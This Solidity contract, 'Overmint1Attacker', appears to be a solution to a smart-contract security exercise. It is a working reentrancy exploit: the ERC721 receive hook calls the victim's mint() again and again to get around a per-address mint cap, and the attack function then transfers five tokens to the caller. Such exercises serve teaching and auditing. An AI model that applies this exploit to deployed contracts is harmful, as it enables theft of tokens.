// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "../Overmint1.sol";
import "hardhat/console.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public victimAddress;

    constructor(Overmint1 victimAddress_) {
        victimAddress = victimAddress_;
    }

    function attack() external {
        victimAddress.mint();
        //console.log(victimAddress.balanceOf(address(this)));

        victimAddress.transferFrom(address(this), msg.sender, 1);
        victimAddress.transferFrom(address(this), msg.sender, 2);
        victimAddress.transferFrom(address(this), msg.sender, 3);
        victimAddress.transferFrom(address(this), msg.sender, 4);
        victimAddress.transferFrom(address(this), msg.sender, 5);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (victimAddress.balanceOf(address(this)) < 5) {
            victimAddress.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
